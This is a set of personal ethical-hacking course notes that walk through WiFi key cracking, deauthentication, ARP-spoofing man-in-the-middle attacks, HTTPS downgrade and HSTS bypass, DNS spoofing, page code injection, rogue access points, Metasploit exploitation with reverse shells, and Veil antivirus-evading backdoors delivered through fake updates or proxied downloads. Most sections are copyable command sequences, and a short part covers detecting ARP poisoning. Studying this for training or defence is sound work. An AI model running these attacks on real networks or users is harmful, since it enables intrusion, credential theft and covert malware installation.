# Notes

## Lab

- VirtualBox - <https://www.virtualbox.org/wiki/Downloads>
- Install VM VirtualBox Extension Pack - Support for USB 2.0 and USB 3.0 devices
- custom kali linux -> <https://zsecurity.org/download-custom-kali/>
  - Network -> NATNetwork
  - How To Fix Nat Network Issue In Virtual Box -> <https://www.youtube.com/watch?v=y0PMFg-oAEs>
  - <https://zsecurity.org/got-a-blank-screen-after-importing-kali-in-virtual-box-heres-how-to-fix-it/>
  - Installing Kali 2017.1 In Virtual Box In Less Than 3 Minutes -> <https://www.youtube.com/watch?v=TU-TgF_UnAI>
  - save snapshot after first setup
  - kali tools doc -> <https://tools.kali.org/tools-listing>
  - windows VM -> <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/>
  - wireless adapter -> VM settings -> ports -> select usb controller -> add
  - ifconfig -> will show newly added adapter (ex: wlan0)
- Windows as Virtual machine:
  - <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/>

# Network Penetration Testing/Hacking

- Pre Connection attack
- Gaining Access
- Post connection attack

## change Mac address

- Increase anonymity
- Impersonate other devices
- Bypass filters
- steps:

```txt
  - ifconfig (look for the newly added adapter, ex: wlan0), need to change the ether field
  - disable network -> ifconfig wlan0 down
  - ifconfig waln0 hw ether 11:22:33:44:55
  - enable network -> ifconfig wlan0 up
  - check -> ifconfig
  - it will reset after restarting
```

## Change to Monitor mode

- by default device only listens data which has the mac address in destination fields of the messages
- capture all the data transferred in the air within range by changing to Monitor mode
- steps:

```
  - iwconfig -> to see wireless interface only
  - by default mode is Managed mode
  - ifconfig waln0 down
  - kill any process which may interfere in Monitor mode (kills all connection but connection not required in pre-connection attacks)
    - command -> airmon-ng check kill
  - iwconfig wlan0 mode monitor
  - ifconfig wlan0 up
  - check -> iwconfig
```

# Pre-connection attack

## Packet Sniffing (Using Airodump-ng)

- Part of the aircrack-ng suit.
- Airodump-ng is a packet sniffer;
- Used to capture all packets within range.
- Display detailed info about networks around us.
- Connected clients ….etc
- use:

```
  - check network interfere name -> iwconfig
  - airodump-ng [MonitorModeInterface]
  - https://tools.kali.org/wireless-attacks/airodump-ng
  - output details -> https://www.aircrack-ng.org/doku.php?id=airodump-ng
  - airodump-ng --band a [MonitorModeInterface] (capture 5gz frequency)
  - airodump-ng --band abg [MonitorModeInterface] (capture 2.4gz and 5gz frequency both)
```

## Network Hacking - Sniffing data for single Network device

```
- airodump-ng mon0
- airodump-ng -bssid FC:15:B4:00:00:00 --channel 2 --write test mon0
```

- details:
  - sniff data from specific bssid : FC:15:B4:00:00:00
  - listen data on channel : 2
  - write all the data to file: Test
  - wireless adapter in monitor mode : mon0
- wireshark -> open test-01.cap file

## Deauthentication Attack

- Disconnect any client from any network
- Works on encrypted networks (WEP, WPA & WPA2).
- No need to know the network key.
- No need to connect to the network.
- use:

```
  - aireplay-ng --deauth [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
  - aireplay-ng --deauth 10000000 -a FC:15:B4:00:00:00 -c FF:FF:FF:00:00:00 mon0
  - https://tools.kali.org/wireless-attacks/aireplay-ng
```

- theory:
  - Impersonate as client to access point(router) to Disconnect (by changeing self mac to client mac)
  - Impersonate as access point(router) to client to disconnect on client request (changing mac to router's mac)

## Gaining Access - WEP Cracking

- details:
  - Wired equivalent Privacy
  - Old encryption, uses RC4 algorithm
  - easily cracked
- theory:
  - Client encrypts data using a key
    - Each packet is encrypted using a unique key stream
    - Random initialization vector (IV) is used to generate the keys streams
    - The initialization vector is only 24 bits!
    - IV + Key (password) = Key stream
    - Keystream + "Data to send to the router” = ASDKASDIASDJA
  - Encrypted packet sent in the air.
    - IV is sent with data in plain format
  - Router decrypts packet using the key
- weakness:
  - IV is too small (only 24 bits)
  - IV is sent in plain text
- Conclusion:
  - To crack WEP we need to:
  - Capture a large number of packets/IVs → using airodump-ng
  - Analyse the captured IVs and crack the key  → using aircrack-ng
  - Problem:
    - If network is not busy
    - It would take some time to capture enough IVs
  - Solution:
    - Force the AP to generate new IVs (Fake Authentication and ARP Request Replay)
- steps:

```
  - airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write basic_wep mon0
  - aircrack-ng basic_wep-01.cap
  - use Ascii key or hex key with all semicolon removed to connection to device
```

## Fake Authentication Attack

- If network is not busy -> we need Force the AP(Access Point) to generate new IVs (Fake Authentication)
- we need to associate to the Network (tell the network that we want to communicate with it, by default access point ignore requests they get unless the device is connected to them or associated with it)
- command:

```
  - monitor -> airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write arp_replay mon0
  - run attack -> aireplay-ng --fakeauth 0 -a FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
  - FC:15:B4:00:00:00 is the target access point
  - 11:22:33:44:55 my wireless adapter mac address
  - can get: ifconfig ->  first 12 digitals of unspec field, replace - with :
```

## WEP Cracking - ARP Request Replay Attack

- run airodump-ng againest the target network
- command -> airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write arp_replay mon0
- associate with target network with Fake Authentication  
- Run ARP Replay attack
- command -> aireplay-ng --arpreplay -b FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
- it will:
  - Wait for an ARP packet
  - Capture it, and replay it (retransmit it)
  - This causes the AP to produce another packet with a new IV
  - Keep doing this till we have enough IVs to crack the key
- after a large number of IV got transmitted, associate ones more and then do aircrack
- command -> aireplay-ng --fakeauth 0 -a FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
- command -> aircrack-ng arp_replay-01.cap
- IV can be 64 or 128bit Length
- aircrack-ng may require more IV packets

## Introduction WPA and WPA2 Cracking

- Both can be cracked using the same methods
- Made to address the issues in WEP.
- Much more secure.
- Each packet is encrypted using a unique temporary key.
- Packets contain no useful information.

## WPA / WPA2 Cracking - Exploiting WPS (Cracking without Wordlist)

- WPS is a feature that can be used with WPA & WPA2.
- Allows clients to connect without the password.
- Authentication is done using an 8 digit pin.
- 8 Digits is very small.
- We can try all possible pins in relatively short time.
- Then the WPS pin can be used to compute the actual password.
- PS: This only works if the router is configured not to use PBC (Push Button
Authentication).
- process:

```
# tool to check all the networks around me with WPS enabled
$ wash --interface [NetworkInterfaceInMonitorMode]
# do fake Authentication attack (to associate with network)
$ aireplay-ng --fakeauth 30 -a [TargetMacAddr] -h [MyWifiAdaptorMacAddr] [NetworkInterfaceInMonitorMode]
$ aireplay-ng --fakeauth 30 -a FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
# in another terminal call program reaver to bruteforce the pin
$reaver --bssid [TargetNetworkMacAddr] --channel [TargetNetworkChannel] --interface [NetworkInterfaceInMonitorMode]  -vvv --no-associate
# --no-associate because we are doing association separately
# first start reaver than airplay-ng
# reaver will give WPS key and WPA PIN
## reaver older version added in repo.. link for latest version: https://ufile.io/lro4nkdv (might have a bug)
```

## WPA / WPA2 Cracking - NO WPS enabled (Cracking with Wordlist)

- Packets contain no useful data
- Only packets that can aid with the cracking process are the handshake
packets.
  - These are 4 packets sent when a client connects to the network.
- The handshake does not contain data the helps recover the key.
- It contains data that can be used to check weather a key is valid or
not.
- Two things needed to crack WPA/WPA2 :
  - 4-way handshake.
  - Wordlist.
- password and these information are used to generate MIC:
  - SP Address
  - STA Address
  - AP Nonce
  - STA Nonce
  - EAPOL
  - Payload
- we matches our generated MIC with retrieved MIC
- MIC is used by access point to verifiy if password is correct or not
- **Capturing the WPA / WPA2 handshape**

```
airodump-ng -bssid [TargetNetworkMacAddr] --channel [TargetNetworkChannel] --write [output_file_name] [MonitorModeInterface]
# now wait for new clients to connect to capture the handshake
# or do De-authentication attack on a client so that when it reconnects, we'll capture the handshake
# handshake will be stored in output_file

```

- Some wordlist:

```

ftp://ftp.openwall.com/pub/wordlists/
http://www.openwall.com/mirrors/
https://github.com/danielmiessler/SecLists
http://www.outpost9.com/files/WordLists.html
http://www.vulnerabilityassessment.co.uk/passwords.htm
http://packetstormsecurity.org/Crackers/wordlists/
http://www.ai.uga.edu/ftplib/natural-language/moby/
http://www.cotse.com/tools/wordlists1.htm
http://www.cotse.com/tools/wordlists2.htm
http://wordlist.sourceforge.net/
```

- Creating a Wordlist:

```
Crunch can be used to create a wordlist.
Syntax:
crunch [min] [max] [characters] -t [pattern] -o [FileName]
Example:
crunch 6 8 123abc$ -i wordlist -t a@@@@b
Generated passes:
aaaaab
aabbbb
aan$$b
```

- cracking using aircrack-ng:

```
$aircrack-ng output_file.cap -w wordlist.txt
#handshake is stored in output_file.cap
#WordLists is stored in wordlist.txt
```

- Note: social Engineering (evil twin attacks) can be used to get the password from a client

# Post Connection attack

## Information gathering

- Discovering Devices connected to same network:

```
netdisconver -i [wiredinterface] -r 10.0.2.1/24
# will discover all IPs from 10.0.2.1 to 10.0.2.254
netdisconver -i [wirelessinterface] -r 192.168.0.1/24
# will discover all IPs from 192.168.0.1 to 192.168.0.254
```

- Network Mapping (NMap), HUGE security scanner.
- From an IP/IP range it can discover:
  - Open ports.
  - Running services.
  - Operating system.
  - Connected clients.
  - and more
- run -> **zenmap**
  - put ip or ip range in target
  - profile- > details in scan

```
Hack: iPhone have no ssh open until jailbroken
username -> root
default password is -> alpine
most user doesn't know or care to change.
```

## ARP Protocol

Simple protocol used to map IP Address of a machine to its MAC address

- all communicate require a source mac addr and destination mac addr
- device A who wants to communicate with device code B
- device A broadcast an ARP request to all the device in same network, to get the mac address to a certain IP
- all device ignore and only the device with request IP responds with its MAC Address
- No verification of mac is done by requesting entity
- each computer maintain a table which link the ip addresses to mac addresses

  ```
  $ arp -a
  ```

## MITM Attack (Man in the middle attack)

any request/response to access point goes through hacker computer, can be achieved with ARP Poisoning

- we can exploit the ARP protocol
- send two requests:
  - one to access point, saying I'm the client
  - one to client (target machine/ victim), saying I'm the access point
- access point and victim will update their ARP table
- Reason: no verification is done for response

## ARP Spoofing (Using arpspoof)

- arpspoof tool to run arp spoofing attacks.
- Simple and reliable.
- Ported to most operating systems including Android and iOS.
- Usage is always the same.
- use:

  ```
  #run these commands in two shells
  arpspoof -i [interface] -t [clientIP] [gatewayIP]
  arpspoof -i [interface] -t [gatewayIP] [clientIP]
  ## requests from MITM will not go to access point, it doesn't allow due to security feature,
  port forwarding needed to do so:
  $ echo 1> /proc/sys/net/ipv4/ip_forward
  ## open wireshark to see all network traffic flow through your interface
  Note: wireshark used to monitor network traffic on its machine but as we are MITM and all traffic flows through us, we'd be able to see it
  ```

## ARP Spoofing (Using MITMf and Bettercap)

- Framework to run MITM attacks.
- Can be used to :
  - ARP Spoof targets (redirect the flow of packets)
  - Sniff data (urls, username passwords).
  - Bypass HTTPS.
  - Redirect domain requests (DNS Spoofing).
  - Inject code in loaded pages.
  - And more!
- mitmf use:

```
mitmf --arp --spoof -i [interface] --target [clientIP] --gateway [gatewayIP]
```

- bettercap use (will be using this mostly ):

```
bettercap -iface [interface]
```

## Bettercap

- get help -> bettercap --help
- a new prompt will open on command -> bettercap -iface [interface]
- type **help** to see list of modules and commands
- module -> events.stream : handle all the events running in background
- type **help module_name** to see help about module
- module -> net.probe : keep probing the new hosts on the network by sending dummy UDP packets to every possible IP in subnet
- type **module_name on** to enable a module. ex: net.probe on
- module -> net.recon : handles the response of net.probe UDP packets
- type **net.show** get all the connected clients
- module -> **arp.spoof** : for arp spoofing
- type **caplets.show** : list all caplets
- ARP spoofing:
  - net.probe on
  - set arp.spoof.fullduplex true   ( listen both side communicate from client and AP)
  - set arp.target.spoof [TargetDeviceIP]
  - apr.spoof on
- capturing all data and analysing by Bettercap
  - module -> net.sniff : anything flows through computer will be captured and analysed by this module
  - net.sniff on
- <http://vulnweb.com> : http sites for testingf

## ARP Spoofing (Create script - caplet):

- caplet : text file that contains all the commands
write all the command to a file and save as file_name.cap:

```
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.target 192.168.0.4
arp.spoof on
set net.sniff.local true
net.sniff on
```

- net.sniff.local : sniff all data even if its local data (in https bettercap will thinks that data is of its been sent from our own computer)
- bettercap -iface wlan0 -caplet file_name.cap

## HTTPS and bypass by bettercap

Problem:

- Data in HTTP is sent as plain text.
- A MITM can read and edit requests and responses. → not secure
Solution:
- Use HTTPS.
- HTTPS is an adaptation of HTTP.
- Encrypt HTTP using TLS (Transport Layer Security) or SSL (Secure Sockets Layer).

**Bypass HTTPS:** <br>

- Problem: Most websites use HTTPS → Sniffed data will be encrypted.
- Solution: Downgrade HTTPS to HTTP.
- bettercap provide the caplet to downgrade HTTPS to HTTP
- it has a bug (correct version added on github in same repository as hstshijack.zip)
- extract it in directory /usr/share/bettercap/caplets/ (delete existing one there)

**Downgrade HTTPS to HTTP.** (SSL Stripping) <br>

```
- bettercap -iface wlan0 -caplet start_spoof.cap    ---------> (start_spoof.cap if caplet we created above to start sniffing)
- type name of caplet to run ----> hstshijack/hstshijack
```

**HSTS** <br>
Modern web browsers comes with a list of websites that they should only load over https like facebook, twitter etc

- browser's doing this check locally, nothing can be done by MITM
**ByPass HSTS** <br>
- Trick the browser into loading a different website
- replace all links for HSTS websites with similar links
  - Ex: facebook.com -> facebook.corn
- using hsts caplet to bypass it added in repository -> hstshijack.cap

  ```
  set hstshijack.targets              -> hsts websites
  set hstshijack.replacement          -> replacements for target websites
  set hstshijack.Payload              -> js file for code injection
  ```

- running the attack:

```
bettercap -iface wlan0 -caplet start_spoof.cap
hstshijack/hstshijack
```

- if doesn't work, means site is cached, try after removing browsing Data
- will not work url is directly entered in the search bar, user needs to search the target website on search engine (let's say google.in) and then click on the link from search result to work the hsts bypassing
- script will work in background and replace all link to target website in search result
- Link to onw issue: HSTS Hijack caplet dial tcp error
  - <https://www.youtube.com/watch?v=XoUPHF-wyMc&feature=youtu.be>
- bettercap V2.23:
  - <https://ufile.io/joxjzflg>
  - alternate added in repository

## DNS Spoofing (Controlling DNS Requests on the Network) - MITM

- DNS → Domain Name System.
  - Translates domain names to IP addresses.
  - request for website goes to DNS, will in result return the IP of the server
  - Eg: links www.google.com to the IP of Google’s server. bing.com -> 204.79.197.200 etc
- when we're MITM, request first comes to us before going to DNS server.
- we give any other website in result to user's request
- works against all http and https website
- doesn't work against hsts websites

**Redirecting to Local web server for a DNS request**

```
## start local webserver (kali linux comes with default)
$ service apache2 start
## if goes to ip of linux machine, it will redirect to default page of local server
## page is stored at location -> /var/www/html/index.html
## replace the file to show the page for a request
$ bettercap -iface wlan0 -caplet start_spoof.cap
## inside bettercap terminal -> help dns.spoof
## dns.spoof.address -> redirect to this website on DNS request , default local address
$ set dns.spoof.all true
## dns.spoof.domains -> comma seperate list of domains to target
$ set dns.spoof.domains google.com,*.google.com
$ dns.spoof on
```

- use:
  - replace login page with fake page
  - redirect to another website with malware
  - server fake updates (check if user has new updates, we can DNS spoof them send them fake updates)


## Injecting Javascript code (MITM)

Inject Javascript/HTML code in loaded pages

- Code gets executed by the target browser
  - → use the --inject plugin
- Code can be :
  1. Stored in  a file --js-file or --html-file
  2. Stored online --js-url or --html-url
  3. Supplied through the command line --js-payload or --html-payload
- Can be used for:
  1. replace links
  2. Replace images
  3. insert html elements
  4. Hook target browser to exploitation Framework
  5. and more!!
- process:

```
# take simple Javascript file and save as alert.js:
  alert('Javascript test');
# in bettercap hstshijack  caplet (custom), edit hstshijack.cap
# set hstshijack.payload *:/root/alert.js
@before colon is the url of webpage we want to inject our code into (astrisk means all pages)
@after colon is the path of Javascript code
@if more than one, add seperated with comma
# start arp spoofing:
$ bettercap -iface wlan0 -caplet start_spoof.cap
# start hstshijack plugin
```

- limitation:
  - works against http and https (downgraded to http) and only work with hsts when bypassed

## wireshark Tool

- it is network protocol analyser
- Designed to help network administrators to keep track of what happening in their network
- How does it works?
  - allows you to select a network Interface
  - logs packets that flows through that selected Interface
  - Analyse all the packets
- When we are the MITM, wireshark can be used to sniff & analyse traffic sent/received by targets
- How to use:
  - open wireshark
  - select interface or open captured file
- **Sniffing & Analysing data**:
  - select the interface we're doing MITM attack
  - in output -> you can store the packets to a file (optional)
  - you can apply filter (ex: http)
  - double click on a packet to open it, you can see data:
    - protocol Used
    - port on which data is sent
    - source and dest mac address
    - hypertext Transfer Protocol contains form data (in POST request : login info etc )
  - right click a packet and : Follow > HTTP Stream --> Follow the stream and response of the request

## Creating a Fake Access Point (Honeypot) -

Hacker machine having any interface with internet Access (most likely via NATNetwork) and it's wireless adapter broadcasting signal in AP mode (behaving like a router): </br>
Any device connected to it will be victim of MITM attack

- **Using Mana-Toolkit** : Tools run rogue access point attacks.
- It can:
  - Automatically configure and create fake AP.
  - Automatically sniff data.
  - Automatically bypass https. ….etc
- Mana has 3 main start scripts:
  1. start-noupstream.sh - starts fake AP with no internet access.
  2. start-nat-simple.sh - starts fake AP with internet access.
  3. start-nat-full.sh - starts fake AP with internet access, and automatically starts sniffing data, bypass https.
- install Mana : script n repo -> install_mana.sh
- it can be done manually as well, and a lot attack can be done with Fake access point
- preferably use : start-nat-simple.sh (sniffing can be started with bettercap separately)
- how to setup:
  - VM Network setting -> NATNetwork (i.e. eth0 : interface connected to internet)
  - wireless adapter connected to VM -> wlan0 (in managed mode and not connected to internet)
  - modify mana-Toolkit config file : leafpad /etc/mana-toolkit/hostapt-mana.conf
    - modify interface to broadcast the signal From
      - interface=wlan0
    - you can modify ssid (optional)
  - modify start script that start mana-toolkit : leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
    - modify upstream internet (with internet access, eth0 in our case)
      - upstream=eth0
    - modify phy (interface that is going to broadcast signal, in our case : wireless adaptor)
      - phy=wlan0
  - call start mana script
    - bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
  - if error occur first time kill the command and run it again
  - do not test it from host machine as Fake access point is using internet from Host machine (NATNetwork), test it from another VM or another device (ex: phone)

## Detecting/Prevention ARP Poisoning Attacks

- run command: arp -a
- check if some other device in your network has same mac address as your router
- use  tool  to detect : <http://www.xarp.net/#download>
  - **Using wireshark to detect suspicious activities in network**
  - wireshark -> preference -> protocols -> arp/rarp -> enable detect ARP request storms
  - give the device which is trying to discover all the device in the network and give notification
  - to verify : run command from another device : netdisconver
  - you can check result at : wireshark -> analyse -> Expert Information
- Prevention: Encrypt data :
  - Use HTTPS Everywhere plugin : convert all request to https (request domain should support https as well)
    - limitation:
      - do nothing for website that do not support HTTPS
      - visit domains still visible
      - DNS spoofing still possible
  - Use VPN
    - create a encrypted tunnel between your device and server
    - request first goes to VPN server first and then to requested webserver
    - VPN server can read all your data, so take VPN provider carefully (avoid free providers)
    - make sure VPN provider keep no logs
    - HTTPS Everywhere plugin can be used with VPN (VPN provider can not see data over HTTPS)

# Gaining Access to Computer devices

any electronic device </br>

- **Server Side Attacks**
- Do not require user interaction, all we need is a target IP
- starts with information gathering, find open ports, installed services and work from there
- mostly applies to webserver, application and device that are not get used much by users
- **Client Side Attacks**:
- Require user interaction, such as opening a file, a links
- information gathering is key here, create a trojan and use social engineering to get the target to run it
- **Post exploitation**
- what can be done after gaining Access

# Gaining Access - Server Side Attacks

## Installing Metasploitable as a Virtual Machine

- this machine will act as a server (victim that we will attack)
- Metasploitable is a vulnerable linux distro, this OS contains a number of vulnerabilities
- it is designed for penetrators to try and hack it
- download page: <https://information.rapid7.com/download-metasploitable-download.html>
- Steps:
  - extract zip
  - add new VM in Virtual box -> linux : ubuntu64
  - at choosing hard disk -> use an existing virtual hard disk file -> *choose .vmdk file*
  - username : msfadmin
  - password : msfadmin
  - to shoutdown -> sudo poweroff
- run metasploitable webserver in same network with it's IP address
- Netowrk configuration as NATNetwork

## Introduction : Server side Attacks

- Need an IP address.
- Very simple if target is on the same network (netdiscover or zenmap).
- If target has a domain, then a simple ping will return its IP.
  - > ping www.facebook.com
- Getting the IP is tricker if the target is a personal computer, might be useless if the target is accessing the internet through a network as the IP will be the router IP and not the targets,
  - client side attacks are more effective in this case as reverse connection can be used.
- **Information Gathering**:
  - Try default password (ssh iPad case).
  - Services might be mis-configured, such as the “r” service. Ports 512, 513, 514
    - ports with anonymous FTP login can be accessed without user credentials
  - Some might even contain a back door!
    - using zenmap list all services and google the vulnerabilities of program's version online
    - search if installed version have known exploits or backdoors
  - Code execution vulnerabilities.
    - https://rapid7.com is who make metasploitable, it has a lot of vulnerabilities/backdoors list
    - ex: vsftpd v2.3.4 backdoor command execution

## Server Side Attack - METASPLOIT

Metasploit is an exploit development and execution tool. It can also be used
to carry out other penetration testing tasks such as port scans, service
identification and post exploitation tasks.

```
 > msfconsole - runs the metasploit console
 > help - shows help
 > show [something] - something can be exploits, payloads, auxiliaries or options.
 > use [something] - use a certain exploit, payload or auxiliary.
 > set [option] [value] - configure [option] to have a value of [value]
 > exploit - runs the current task
```

- example:

```
# we went to zenmap, found the service vsftpd v2.3.4 and googled it
# we found a vulnerability at https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor as :
## VSFTPD V2.3.4 BACKDOOR COMMAND EXECUTION
## MODULE NAME : exploit/unix/ftp/vsftpd_234_backdoor
# now run msfconsole
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show options
msf exploit(vsftpd_234_backdoor) > set RHOST IP_ADDR_TARGET_MACHINE
msf exploit(vsftpd_234_backdoor) > show options
msf exploit(vsftpd_234_backdoor) > exploit
## last command will run the exploit (if nothing happened, run it again)
## now you're in target machine console, verify with:
> uname -a
```

- RHOST is usually target machine, from where the connection is coming From
- LHOST is usually hacker machine, to where the request is transferred
- Payloads are small piece of code that are executed on target machine once the vulnerability is exploited, payload will further do something to do something like gaining control
- **payload example**: for samba 3.x exploit ->
- SAMBA "USERNAME MAP SC  RIPT" COMMAND EXECUTION

```
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show options
msf exploit(usermap_script) > set RHOST IP_ADDR_TARGET_MACHINE
msf exploit(usermap_script) > show payloads        -------> show list of payloads
msf exploit(usermap_script) > set PAYLOAD cmd/unix/reverse_netcat
msf exploit(usermap_script) > show options
msf exploit(usermap_script) > set LHOST IP_ADDR_HACKER_MACHINE      -----> listening address
msf exploit(usermap_script) > set LPORT PORT_HACKER_MACHINE      -----> listening port
msf exploit(usermap_script) > show options
msf exploit(usermap_script) > exploit
```

- bind payload, open a port on target computer and we connect to that port
- reverse payload, do opposite, open port on hacker machine and connect from target machine to hacker machine (allow us to bypass firewall, as connection going outside from target machine)
- LPORT PORT_HACKER_MACHINE can be set to 80 or 8080, never filtered by firewall as this port is used by webservers

## Server Side Attack - Metasploit community

Metasploit community is a GUI that can discover open ports and installed
services on the target machine, not only that but it maps these services
to metasploit modules and exploits and allow us to run these modules
from the web GUI.

- steps:
  1. Download it from https://www.rapid7.com/products/metasploit/metasploit-community-registration.jsp
  2. Change permissions to executable. > chmod +x [installer file name]
  3. Run installer > ./[installer file name]
  4. Once complete, metasploit community can be started as a service.

  ```
   > service metasploit start
  ```

  5. Now navigate to https://localhost:3790 and enter your product key.

## Server Side Attacks - Nexpose

Nexpose is a vulnerability management framework,

- it allows us to discover, assess and act on discovered vulnerabilities,
- it also tells us a lot of info about the discovered vulnerabilities, weather they are exploitable
- and helps us write a report at the end of the assessment.
- might not work on kali 3 (nexpose-rolling-hack.txt attached in the repository)
- steps:
  1. Download it from <http://www.rapid7.com/products/nexpose/compare-downloads.jsp>
  2. Stop postgresql > service postgresql stop
  3. Change permissions to executable. > chmod +x [installer file name]
  4. Run installer > ./[installer file name]
  5. enter valid email, key will be sent to it. username and password will be used to login

## Nexpose : Scanning a target server for vulnerabilities

- make sure database comes with kali linux if stopped. because nexpose use its own database and both running on same port might conflict
  - service postgresql stop
- go to nexpose directory:
  - cd /opt/rapid7/nexpose/
- run nexpose: -----> (running it for first time might take time as it will do some configuration)
  - ./nsc.sh
- go to url:
  - <https://localhost:3780/>
- login with username and password
- Enter the product key sent to your email address
- Creating a project:
  - Create > Site
  - give NAME
  - **go to asset** and give TARGET in *assets field*
  - **go to authentication** if target require any type of authentication
  - **go to template** : try different profiles
    - web-spider: finds all files and directories
  - save and start scan
- result analysis:
  - shows malware, exploits and vulnerabilities
  - show software installed
  - show installed Services
  - on clicking any service, it will give detailed result
  - vulnerability page show categorized list of vulnerabilities
    - you can sort based on risk factor
  - shoes solutions to fix
  - different level of reports can be generated

***

# Gaining Access - Client Side Attacks

## Introduction : Client side Attacks

- Use if server side attacks fail OR If IP is probably useless
- if target is hidden behind a router
- it Require user interaction (open a link, picture, pdf etc)
- Social engineering can be very useful
- Information gathering is vital (not only the services, but websites used by target, email, friends etc)

## Client side Attacks : Installing Veil Framework

- a backdoor is a file that gives us full control over the machine that it gets executed on
- backdoor can be caught by anti-virus programs
- Viel is framework for generating *Undetectable* backdoors
- <https://github.com/Veil-Framework/Veil>

**Generating an undetectable backdoor using - Veil-Evasion** </br>

1. Install veil-evasion > apt-get install veil-evasion
    - (on install *apt-get install veil*-> it has two tools evasion and Ordance)
    1. Evasion : generates backdoors
    2. Ordance : Generate Payloads
2. Run veil-evasion > veil-evasion
    - (or run *veil* > list > use 1   --->(Evasion))
3. Select a backdoor/payload > use [payload number]
    - command to see available payloads > list
4. Set options > set [option] [value]
5. Generate backdoor > generate
    - INFO:
    - Payloads are divided into 3 parts: FIRST/SECOND/THIRD   (General naming patterns)
    1. FIRST: Programming language payloads is written in
    2. SECOND: type of the payload  
        - ex: meterpreter: payload designed my metasploit, it runs in memory and allow us to migrate between system processes, ex: explorer. it doesn't leave a footprint so hard to detect
    3. THIRD: method that's gonna be used to establish the connection
      - ex: rev_https.py : creates reverse https connection
      - reverse: connection is gonna come from target computer to hacker computer
      - able to bypass firewall/anti-virus in reverse connection

- Example:

```
> Veil
> list  
> use 1       --------> (Select Evasion)
> list
> use 15        --------> (go/meterpreter/rev_https.py)
# it will show payload info and options
# LHOST and LPORT is the ip address and port we'll be listening connection on . i.e. our computer ip
> set LHOST 10.0.2.14            ---->IP_ADDR_HACKER_MACHINE
> set LPORT 8080    ------->PORT_HACKER_MACHINE
## They way anti-virus programs work is that they have a very large database of signatures corresponds to file that contains harmful code . for ex: backdoors
## to change the signature we try to modify the backdoor file as much as possible to make it unique by updating it's parameters to bypass signature database
## you can set optional parameters
> set PROCESSORS 1    ------>(doesn't make much difference)
> set SLEEP 6     ----->(doesn't make much difference)
> generate -------> give name the backdoor. ex: rev_https_8080
# it will result the back of backdoor file as .exe
# metasploit RC file can be directly loaded in future for use
## you can verify you backdoor's signature if it can bypass anti-virus programs at:
> scan the file at
    - https://nodistribute.com
    - https://spyralscanner.net/
    - https://antiscan.me/
> or https://zsecurity.org/bypassing-anti-virtus-hacking-windows-10-using-empire/
# keep veil up to date
# Start listening to connections before sending backdoor
```

**Backdooring exe’s**

1. Run veil-evasion > veil-evasion
2. Select a generic/backdoor_factory > use [payload number]
3. Set options > set [option] [value]
4. Set original exe > set ORIGINAL_EXE [full path]
5. Generate backdoor > generate

**Listening for connections : Run hander**  <br>
For above backdoor to work, we need to open a port to listen any connection on that port

- we'll use metasploit framework to listen connections
    1. Run metasploit > msfconsole
    2. Use handler module. > use exploit/multi/handler
    3. Set payload > set PAYLOAD [veil payload]   --- TARGET/TYPE/METHOD
    4. Set ip > set LHOST [your ip]
    5. Set port > set LPORT [veil port]
    6. exploit > exploit
- example:

```txt
$ msfconsole
> use exploit/multi/handler
> set PAYLOAD windows/meterpreter/reverse_https
> show options
> set LHOST 10.0.2.14
> set LPORT 8080    ---->(on 80, we'll running our webserver to deliver backdoor)
> exploit
##################################################
> session -l    ---> to see all active sessions
> session -i 1  ----> select first session
```

## Basic Backdoor delivery method : WINDOWS 10 (Just to verify backdoor)

- copy the .exe file generate using veil
  - **from** /var/lib/veil-evasion/output/compiled/file_name.exe
  - **to**  /var/www/html/_create_a_folder_here_/file_name.exe
    - __created folder name will go in url__
- start webserver
  - service apache2 start
- start **listening to connections** using msfconsole
- go to url from your target Machine
  - <http://IP_ADDR_HACKER_MACHINE/>__FOLDER_NAME_FROM_ABOVE_STEP__/
- download and execute exe

## Client Side Attacks : Backdoor delivery method 1 - Spoofing Software Updates

- Fake an update for an already installed program.
- Install backdoor instead of the update.
- Requires DNS spoofing + Evilgrade (a server to serve the update)
- You need to be MITM
- when we get a request for an update instead of giving the IP of actual server, we can give the IP of hacker server (which is running a program EvilGrade) and it will tell user that it has an update and server the backdoor
- steps:
   1. Download and install Evilgrade using the instructions in the resources.
   2. Start Evilgrade.                   > ./evilgrade
   3. Check programs that can be hijacked.   > show modules
   4. Select one                   > configure [module]
   5. Check the options that can be set     > show options
   6. Set backdoor location               > set agent [agent location]  (malware .exe file created by veil)
   7. you can change the endsite as well, where user will be redirected after update   > set endsite [endsite url]
   8. Start server                      > start
   9. Start dns spoofing  (domain for which you want to give the fake update. 'VirtualHost' field in evilgrade option)
   10. start the handler
      - metasploit -> msfconsole
      - use exploit/multi/handler
      - set PAYLOAD windows/meterpreter/reverse_http    (some problem with https, so use http)
      - set LPORT and VirtualHost
      - exploit

## Client Side Attacks : Backdoor delivery method 2 - backdooring exe download

- Backdoor any exe the target downloads.
- We need to be in the middle of the connection.
- Tool : Backdoor Factory Proxy (find installation steps in repository folder : backdoor-factory-proxy)
- steps:  
  1. edit bdfproxy config -> leafpad /opt/bdfproxy/bdfproxy.cfg
      - Set IP address to your IP in config.
        - look for [[[WindowsIntelx86]]]  and [[[WindowsIntelx64]]]  --> your target Machine
        - HOST = YOUR_IP_ADDRESS
        - Change Proxy mode : proxyMode = transparent
  2. Start bdfproxy. > bdfproxy.py    (program as soon as receive a request it backdoors that program)
  3. Redirect traffic to bdfproxy.  
      - iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
  4. Start listening for connections
      - msfconsole -r /opt/bdfproxy/bdfproxy_msf_resource.rc
      - or it may be at path : /usr/share/bdfproxy/bdf_proxy_msf_resource.rc
